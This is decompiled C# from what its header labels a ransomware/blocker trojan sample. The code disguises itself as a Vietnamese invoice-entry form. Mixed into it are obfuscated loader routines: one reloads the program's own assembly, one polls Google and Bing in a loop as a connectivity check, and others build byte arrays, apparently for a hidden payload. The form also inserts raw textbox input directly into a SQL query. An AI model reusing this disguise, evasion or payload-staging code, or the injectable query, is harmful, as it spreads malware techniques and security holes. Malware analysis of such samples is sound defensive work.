// Decompiled with JetBrains decompiler
// Type: So8.Td23
// Assembly: a7A, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 35A00F83-339C-407C-8770-B1A09BF1E0B3
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.04-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-375b5d8e986b228149dbe2f4cd9df92e697491052531a094fb7172ad0d25bd82.exe

using Ln70;
using Microsoft.VisualBasic.CompilerServices;
using Rn4;
using s5W;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Threading.Tasks;
using System.Windows.Forms;
using Ww0;
using Xb1;

namespace So8
{
  [DesignerGenerated]
  public class Td23 : Form
  {
    private IContainer components;
    private y2D dataaccess;

    public Td23()
    {
      this.dataaccess = new y2D();
      this.a5N();
    }

    [DebuggerNonUserCode]
    protected virtual void e1P(bool Zp8)
    {
      try
      {
        if (!Zp8 || this.components == null)
          return;
        this.components.Dispose();
      }
      finally
      {
        this.Dispose(Zp8);
      }
    }

    [DebuggerStepThrough]
    private void a5N()
    {
      this.txtMaHD = new Label();
      this.txtMaKH = new Label();
      this.Label3 = new Label();
      this.txtMaHDD = new TextBox();
      this.txtMaKHH = new TextBox();
      this.btnOk = new Button();
      this.btnCanc = new Button();
      this.datetimeNgayLap = new DateTimePicker();
      this.SuspendLayout();
      this.txtMaHD.AutoSize = true;
      this.txtMaHD.Location = new Point(13, 26);
      this.txtMaHD.Name = "txtMaHD";
      this.txtMaHD.Size = new Size(41, 13);
      this.txtMaHD.TabIndex = 0;
      this.txtMaHD.Text = "Ma HD";
      this.txtMaKH.AutoSize = true;
      this.txtMaKH.Location = new Point(12, 64);
      this.txtMaKH.Name = "txtMaKH";
      this.txtMaKH.Size = new Size(40, 13);
      this.txtMaKH.TabIndex = 1;
      this.txtMaKH.Text = "Ma KH";
      this.Label3.AutoSize = true;
      this.Label3.Location = new Point(12, 107);
      this.Label3.Name = "Label3";
      this.Label3.Size = new Size(53, 13);
      this.Label3.TabIndex = 2;
      this.Label3.Text = "Ngay Lap";
      this.txtMaHDD.Location = new Point(75, 26);
      this.txtMaHDD.Name = "txtMaHDD";
      this.txtMaHDD.Size = new Size(197, 20);
      this.txtMaHDD.TabIndex = 3;
      this.txtMaKHH.Location = new Point(75, 61);
      this.txtMaKHH.Name = "txtMaKHH";
      this.txtMaKHH.Size = new Size(197, 20);
      this.txtMaKHH.TabIndex = 4;
      this.btnOk.Location = new Point(49, 163);
      this.btnOk.Name = "btnOk";
      this.btnOk.Size = new Size(75, 23);
      this.btnOk.TabIndex = 6;
      this.btnOk.Text = "OK";
      this.btnOk.UseVisualStyleBackColor = true;
      this.btnCanc.Location = new Point(163, 163);
      this.btnCanc.Name = "btnCanc";
      this.btnCanc.Size = new Size(75, 23);
      this.btnCanc.TabIndex = 7;
      this.btnCanc.Text = "Cancel";
      this.btnCanc.UseVisualStyleBackColor = true;
      this.datetimeNgayLap.Location = new Point(71, 101);
      this.datetimeNgayLap.Name = "datetimeNgayLap";
      this.datetimeNgayLap.Size = new Size(200, 20);
      this.datetimeNgayLap.TabIndex = 8;
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.ClientSize = new Size(284, 262);
      this.Controls.Add((Control) this.datetimeNgayLap);
      this.Controls.Add((Control) this.btnCanc);
      this.Controls.Add((Control) this.btnOk);
      this.Controls.Add((Control) this.txtMaKHH);
      this.Controls.Add((Control) this.txtMaHDD);
      this.Controls.Add((Control) this.Label3);
      this.Controls.Add((Control) this.txtMaKH);
      this.Controls.Add((Control) this.txtMaHD);
      this.Name = "AddHD";
      this.Text = "AddHD";
      this.ResumeLayout(false);
      this.PerformLayout();
    }

    [field: AccessedThroughProperty("txtMaHD")]
    internal virtual Label txtMaHD { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    [field: AccessedThroughProperty("txtMaKH")]
    internal virtual Label txtMaKH { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    [field: AccessedThroughProperty("Label3")]
    internal virtual Label Label3 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    [field: AccessedThroughProperty("txtMaHDD")]
    internal virtual TextBox txtMaHDD { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    [field: AccessedThroughProperty("txtMaKHH")]
    internal virtual TextBox txtMaKHH { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    internal virtual Button btnOk
    {
      get => this._btnOk;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Ws4);
        Button btnOk1 = this._btnOk;
        if (btnOk1 != null)
          btnOk1.Click -= eventHandler;
        this._btnOk = value;
        Button btnOk2 = this._btnOk;
        if (btnOk2 == null)
          return;
        btnOk2.Click += eventHandler;
      }
    }

    internal virtual Button btnCanc
    {
      get => this._btnCanc;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.k4S);
        Button btnCanc1 = this._btnCanc;
        if (btnCanc1 != null)
          btnCanc1.Click -= eventHandler;
        this._btnCanc = value;
        Button btnCanc2 = this._btnCanc;
        if (btnCanc2 == null)
          return;
        btnCanc2.Click += eventHandler;
      }
    }

    [field: AccessedThroughProperty("datetimeNgayLap")]
    internal virtual DateTimePicker datetimeNgayLap { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    private bool Zp4() => this.dataaccess.r3Q("INSERT INTO HoaDon (MaHD,MaKH,Ngaylap)" + string.Format("VALUES ('{0}','{1}','{2}')", (object) this.txtMaHDD.Text, (object) this.txtMaKHH.Text, (object) this.datetimeNgayLap.Value.Date));

    internal static string[] Ge5()
    {
      Yb6r.Gp1w();
      Assembly assembly = Assembly.LoadFrom(Environment.GetCommandLineArgs()[0]);
      Kb1.mDic.Add("Ass", (object) assembly);
      return Kq4.r1K();
    }

    internal static bool Nr4()
    {
      string[] strArray1 = new string[2]
      {
        "https://www.google.com/",
        "https://www.bing.com/"
      };
      int num = 0;
      while (num != 2)
      {
        string[] strArray2 = strArray1;
        int index = 0;
        while (index < strArray2.Length)
        {
          if (!y2D.Sy5(strArray2[index]))
          {
            if (num > 0)
              checked { --num; }
            Task.Delay(30000).Wait();
          }
          else
            checked { ++num; }
          checked { ++index; }
        }
      }
      return num == 2;
    }

    private bool j0W() => string.IsNullOrEmpty(this.txtMaHDD.Text) || string.IsNullOrEmpty(this.txtMaKHH.Text) || string.IsNullOrEmpty(Conversions.ToString(this.datetimeNgayLap.Value.Date));

    internal static byte[] g5X(int Yj1) => Xq1.Fw6(Yj1, checked (Yj1 + 1 - 22));

    private void Ws4(object p2K, EventArgs Mw2)
    {
      if (this.j0W())
      {
        int num1 = (int) MessageBox.Show("Chua nhap gia tri", "Error", MessageBoxButtons.OK);
      }
      else
      {
        if (this.Zp4())
        {
          int num2 = (int) MessageBox.Show("Them thanh cong", "Success", MessageBoxButtons.OK);
          this.DialogResult = DialogResult.OK;
        }
        else
        {
          int num3 = (int) MessageBox.Show("Them that bai", "Error", MessageBoxButtons.OK);
          int num4 = (int) MessageBox.Show("ID " + this.txtMaKHH.Text + "Ten: " + this.txtMaHDD.Text + "Date: " + Conversions.ToString(this.datetimeNgayLap.Value));
          this.DialogResult = DialogResult.No;
        }
        this.Close();
      }
    }

    internal static byte[] f6Z(int[] Jk6, int m3M)
    {
      byte[] numArray = new byte[checked (m3M + 1)];
      int num = checked (Jk6.Length - 1);
      int index = 0;
      while (index <= num)
      {
        numArray[index] = checked ((byte) Jk6[index]);
        checked { ++index; }
      }
      return numArray;
    }

    private void k4S(object Zg1, EventArgs Hz3) => this.Close();
  }
}
